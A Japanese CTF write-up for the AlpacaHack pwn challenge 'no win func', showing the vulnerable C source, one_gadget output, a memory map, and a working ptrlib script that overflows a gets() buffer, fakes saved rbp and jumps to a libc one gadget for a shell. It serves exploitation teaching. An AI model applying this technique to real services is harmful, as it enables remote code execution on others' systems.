---
title: Daily AlpacaHack B-SIDE no win func Writeup
author: Ojun
slug: no-win-func
featured: true
draft: false
pubDatetime: 2026-07-19T15:00:00.000Z
description: kappa makiのwriteup
tags:
  - tech
  - ctf
  - pwn
ogImage: "@/assets/images/2026/no-win-func.png"
---

![no win func](@/assets/images/2026/no-win-func.png)

これからAlpacaHackのpwnの問題はできるだけWriteupを書いていこうと思います。

## 概要
ソースコードを以下に示します。
```c
// gcc -o chal main.c -fno-stack-protector -O0

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void) {
    char buffer[64];
    printf("address of printf function: %p\n", printf);
    printf("input > ");
    gets(buffer);
    return 0;
}

__attribute__((constructor)) void setup() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
}
```

まずは`printf`関数のアドレスがリークされて、次に`buffer`変数に好きなデータを書き込めます。セキュリティ機構は、Canaryのみ無効になっています。

## 攻撃
簡単にスタックバッファオーバーフローできる上、libcのアドレスがリークされているので、libcの中の好きなガジェットを使うことができます。

今回の場合、one gadgetを使うのが簡単です。one gadgetとは、条件を満たした上でそのgadgetに処理を移せばシェルが取れるようなgadgetです。`one_gadget`コマンドで調べることができます。

```bash
❯ one_gadget libc.so.6
0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
```

今回は最後のガジェットを使おうと思います。何も考えずに処理をlibcの`0xef52b`に移すと失敗します。なぜなら、オーバーフローすることで`rbp`レジスタがおかしな値になり、「`rbp-0x50`が書き込み可能」などの条件を満たせなくなるからです。

関数呼び出しのとき、saved ripの1つ前はsaved rbpとなっています。つまり、`main`関数終了時にsaved ripに処理が移りますが、その時の`rbp`は、スタック上にあるsaved rbpになります。したがって、オーバーフローのときに、one gadgetのアドレスを指定する前に適切な`rbp`を指定すればよいです。以下のメモリマップを見れば分かる通り、今回はlibcの後半に書き込みが可能な領域があったので、それを転用します。

```
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
    0x560ab3b9c000     0x560ab3b9d000 r--p     1000       0 /chal
    0x560ab3b9d000     0x560ab3b9e000 r-xp     1000    1000 /chal
    0x560ab3b9e000     0x560ab3b9f000 r--p     1000    2000 /chal
    0x560ab3b9f000     0x560ab3ba0000 r--p     1000    2000 /chal
    0x560ab3ba0000     0x560ab3ba1000 rw-p     1000    3000 /chal
    0x7ff2fc1cd000     0x7ff2fc1d0000 rw-p     3000       0 [anon_7ff2fc1cd]
    0x7ff2fc1d0000     0x7ff2fc1f8000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ff2fc1f8000     0x7ff2fc380000 r-xp   188000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ff2fc380000     0x7ff2fc3cf000 r--p    4f000  1b0000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ff2fc3cf000     0x7ff2fc3d3000 r--p     4000  1fe000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ff2fc3d3000     0x7ff2fc3d5000 rw-p     2000  202000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ff2fc3d5000     0x7ff2fc3e2000 rw-p     d000       0 [anon_7ff2fc3d5]
    0x7ff2fc3e4000     0x7ff2fc3e6000 rw-p     2000       0 [anon_7ff2fc3e4]
    0x7ff2fc3e6000     0x7ff2fc3ea000 r--p     4000       0 [vvar]
    0x7ff2fc3ea000     0x7ff2fc3ec000 r--p     2000       0 [vvar_vclock]
    0x7ff2fc3ec000     0x7ff2fc3ee000 r-xp     2000       0 [vdso]
    0x7ff2fc3ee000     0x7ff2fc3ef000 r--p     1000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ff2fc3ef000     0x7ff2fc41a000 r-xp    2b000    1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ff2fc41a000     0x7ff2fc424000 r--p     a000   2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ff2fc424000     0x7ff2fc426000 r--p     2000   36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ff2fc426000     0x7ff2fc428000 rw-p     2000   38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffd86ec8000     0x7ffd86ee9000 rw-p    21000       0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000       0 [vsyscall]
```

あとは、`[rbp-0x78]==NULL`といった条件を満たす必要があります。これは、gdbで逐一実行しながら、先ほど特定したlibcの書き込み可能領域で中身が0になっている部分を探して、そのアドレス+`0x78`を`rbp`として指定すればよいです。

オーバーフローのオフセットを調べたところ72だったので、以下のようにスクリプトを組めばよいです。

```python
from ptrlib import *

io = Socket("localhost 12346")

libc_base = int(io.recvlineafter(b"function: ").decode(),16) - 0x60100
print(f"[*] libc base: {hex(libc_base)}")

libc_writable = libc_base + 0x203000 + 0x200 - 0x88

payload = b"A" * (72-8)
payload += p64(libc_writable)
payload += p64(libc_base + 0xef52b) # one gadget

io.sendlineafter(b"> ", payload)
io.interactive()
```